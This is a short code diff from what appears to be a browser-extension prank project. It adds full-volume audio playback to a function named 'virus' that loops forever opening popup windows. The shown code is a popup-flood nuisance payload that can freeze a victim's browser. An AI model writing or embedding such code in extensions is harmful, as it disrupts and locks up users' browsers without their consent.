@@ -9,6 +9,10 @@
 </html>
 <script>
     function virus(){
+		var myAudio = new Audio();        // create the audio object
+		myAudio.src = chrome.extension.getURL("audio/cena.mp3"); // assign the audio file to it
+		myAudio.volume = 1;
+		myAudio.play();                   // play the music
         for(;;) {
 			window.open("../virus.html").focus();
             var win = window.open("../virus.html", '_blank', "location=yes,height=570,width=520,scrollbars=yes,status=yes");
